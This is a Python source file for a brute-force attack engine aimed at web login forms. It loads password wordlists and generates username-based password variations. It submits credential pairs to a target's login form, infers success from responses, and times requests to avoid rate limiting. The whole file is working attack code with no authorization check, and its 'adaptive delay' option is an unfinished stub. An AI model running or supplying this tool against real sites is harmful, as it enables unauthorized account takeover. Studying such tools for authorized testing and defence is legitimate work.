"""
Main brute force attack engine
"""

import time
import logging
import requests
from typing import List, Tuple, Optional

from .target_info import LoginForm, TargetInfo
from ..utils.config_manager import ConfigManager

logger = logging.getLogger(__name__)


class BruteForceEngine:
    """Main brute force attack engine"""
    
    def __init__(self, target_info: TargetInfo, config_manager: ConfigManager = None):
        self.target_info = target_info
        self.config = config_manager or ConfigManager()
        self.session = requests.Session()
        self._setup_session()
        
    def _setup_session(self):
        """Setup session with headers and configuration"""
        user_agents = self.config.get_user_agents()
        self.session.headers.update({
            'User-Agent': user_agents[0] if user_agents else self.config.get_default_user_agent()
        })
        self.session.cookies.update(self.target_info.session_cookies)
        
    def load_wordlist(self, wordlist_path: str) -> List[str]:
        """Load passwords from wordlist file"""
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            logger.info(f"Loaded {len(passwords)} passwords from {wordlist_path}")
            return passwords
        except FileNotFoundError:
            logger.error(f"Wordlist file not found: {wordlist_path}")
            return []
        except Exception as e:
            logger.error(f"Error loading wordlist: {e}")
            return []
    
    def generate_password_variations(self, base_passwords: List[str], usernames: List[str]) -> List[str]:
        """Generate password variations based on usernames and common patterns"""
        variations = set(base_passwords)
        
        # Get password generation patterns from config
        suffixes = self.config.get_common_suffixes()
        prefixes = self.config.get_common_prefixes()
        
        for username in usernames:
            username_lower = username.lower()
            
            # Add username variations
            variations.add(username)
            variations.add(username_lower)
            
            # Add common suffixes
            for suffix in suffixes:
                variations.add(username + suffix)
                variations.add(username_lower + suffix)
            
            # Add common prefixes
            for prefix in prefixes:
                variations.add(prefix + username)
                variations.add(prefix + username_lower)
        
        # Add common passwords
        common_passwords = ['123456', 'password', 'admin', 'qwerty', 'letmein']
        variations.update(common_passwords)
        
        return list(variations)
    
    def test_credentials(self, login_form: LoginForm, username: str, password: str) -> Tuple[bool, str]:
        """Test a single set of credentials"""
        try:
            # Prepare form data
            form_data = login_form.additional_fields.copy()
            form_data[login_form.username_field] = username
            form_data[login_form.password_field] = password
            
            timeout = self.config.get_timeout()
            
            # Make request
            if login_form.method == 'post':
                response = self.session.post(
                    login_form.action_url,
                    data=form_data,
                    allow_redirects=True,
                    timeout=timeout
                )
            else:
                response = self.session.get(
                    login_form.action_url,
                    params=form_data,
                    allow_redirects=True,
                    timeout=timeout
                )
            
            # Analyze response to determine success/failure
            success = self._analyze_response(response)
            
            if success:
                return True, f"SUCCESS: {username}:{password}"
            else:
                return False, f"Failed: {username}:{password}"
                
        except requests.RequestException as e:
            return False, f"Error testing {username}:{password} - {e}"
    
    def _analyze_response(self, response: requests.Response) -> bool:
        """Analyze response to determine if login was successful"""
        # Check status codes
        success_codes = self.config.get_success_status_codes()
        failure_codes = self.config.get_failure_status_codes()
        
        if response.status_code in success_codes:
            # Redirect often indicates successful login
            if response.status_code in [302, 303]:
                return True
        
        if response.status_code in failure_codes:
            return False
        
        # Check for JSON responses (common in modern web apps)
        content_type = response.headers.get('content-type', '').lower()
        if 'application/json' in content_type:
            try:
                json_data = response.json()
                # Look for success indicators in JSON
                if isinstance(json_data, dict):
                    # Check for common success patterns
                    if any(key in json_data for key in ['token', 'access_token', 'user', 'success']):
                        return True
                    # Check for error messages
                    if any(key in json_data for key in ['error', 'message', 'detail']):
                        error_msg = str(json_data.get('error', '')).lower()
                        if any(indicator in error_msg for indicator in ['invalid', 'incorrect', 'failed', 'wrong']):
                            return False
            except:
                pass
        
        # Check for common success/failure indicators
        success_indicators = self.target_info.success_indicators
        failure_indicators = self.target_info.failure_indicators
        
        response_text = response.text.lower()
        
        # If failure indicators are present, it's likely a failed login
        for indicator in failure_indicators:
            if indicator in response_text:
                return False
        
        # If success indicators are present, it's likely a successful login
        for indicator in success_indicators:
            if indicator in response_text:
                return True
        
        # Check URL changes (common in modern apps)
        if 'login' not in response.url.lower() and len(response.history) > 0:
            return True
        
        # Check for 200 OK with no error messages (might be success)
        if response.status_code == 200 and not any(indicator in response_text for indicator in failure_indicators):
            return True
        
        # Default to False if uncertain
        return False
    
    def run_attack(self, usernames: List[str], passwords: List[str]) -> Optional[Tuple[str, str]]:
        """Run the brute force attack"""
        total_attempts = len(usernames) * len(passwords)
        logger.info(f"Starting brute force attack: {total_attempts} total attempts")
        
        attempt_count = 0
        start_time = time.time()
        delay = self.config.get_default_delay()
        
        for login_form in self.target_info.login_forms:
            logger.info(f"Testing form: {login_form.action_url}")
            
            for username in usernames:
                for password in passwords:
                    attempt_count += 1
                    
                    # Test credentials
                    success, message = self.test_credentials(login_form, username, password)
                    
                    logger.info(f"[{attempt_count}/{total_attempts}] {message}")
                    
                    if success:
                        elapsed_time = time.time() - start_time
                        logger.info(f"Credentials found in {elapsed_time:.2f} seconds!")
                        return username, password
                    
                    # Add delay to avoid rate limiting
                    if self.config.is_adaptive_delay_enabled():
                        # Implement adaptive delay logic here
                        time.sleep(delay)
                    else:
                        time.sleep(delay)
        
        logger.info("Brute force attack completed. No valid credentials found.")
        return None
